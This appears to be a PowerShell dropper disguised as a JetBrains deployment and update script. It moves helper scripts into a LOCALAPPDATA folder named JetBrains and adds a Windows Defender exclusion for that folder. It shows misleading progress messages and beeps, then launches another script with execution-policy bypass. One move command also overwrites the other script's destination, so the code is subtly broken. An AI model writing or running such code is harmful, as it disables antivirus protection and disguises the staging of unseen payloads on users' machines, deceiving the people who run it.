$ErrorActionPreference = 'Stop'

# Original behavior: move JetBrains.ps1 into LOCALAPPDATA and add exclusion for that folder
$Location = "$env:LOCALAPPDATA\JetBrains\Notification.ps1"
$LocationStart = "$env:LOCALAPPDATA\JetBrains\Start.ps1"
$destDir = "$env:LOCALAPPDATA\JetBrains"
New-Item -Path $destDir -ItemType Directory -Force | Out-Null
Move-Item -Path ".\Notification.ps1" -Destination $Location -Force
Move-Item -Path ".\Start.ps1" -Destination $Location -Force

$exclusions = "$env:LOCALAPPDATA\JetBrains"
Set-MpPreference -ExclusionPath $exclusions

# Ensure we can locate sibling scripts reliably
$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }

# A little "noise" generator to produce visible (and audible where supported) activity
function Make-Noise {
    param(
        [int]$Times = 6
    )
    for ($i = 0; $i -lt $Times; $i++) {
        # Visual noise
        $lineLen = Get-Random -Minimum 20 -Maximum 72
        Write-Host ('=' * $lineLen) -ForegroundColor Yellow

        # Small random sleep to vary the output rhythm
        Start-Sleep -Milliseconds (Get-Random -Minimum 80 -Maximum 300)

        # Audible beep where available (safe inside try/catch)
        try {
            # frequency between 400 and 1200Hz, duration 50-200ms
            [console]::Beep((Get-Random -Minimum 400 -Maximum 1200), (Get-Random -Minimum 50 -Maximum 200))
        } catch {
            # On hosts where Beep isn't available, ignore
        }
    }
}

# Announce progress and create some "noise"
Write-Host "JetBrains deployment completed. Preparing to start update script..." -ForegroundColor Cyan
Make-Noise -Times 3

# Attempt to start JetBrainsUpdate.ps1 (sibling to this script)
$updateScript = Join-Path $scriptDir 'JetBrainsUpdate.ps1'

if (Test-Path $updateScript) {
    Write-Host "Found update script at: $updateScript" -ForegroundColor Green

    try {
        # Start the update script in a new PowerShell process so this deploy step can finish independently.
        Start-Process -FilePath "powershell.exe" `
                      -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$updateScript`"" `
                      -WindowStyle Normal
        Write-Host "JetBrainsUpdate.ps1 launched." -ForegroundColor Green
    } catch {
        Write-Warning "Failed to start JetBrainsUpdate.ps1: $_"
        Make-Noise -Times 2
    }
} else {
    Write-Warning "JetBrainsUpdate.ps1 not found in $scriptDir. Skipping update start."
    Make-Noise -Times 2
}

Write-Host "Deploy script finished." -ForegroundColor Cyan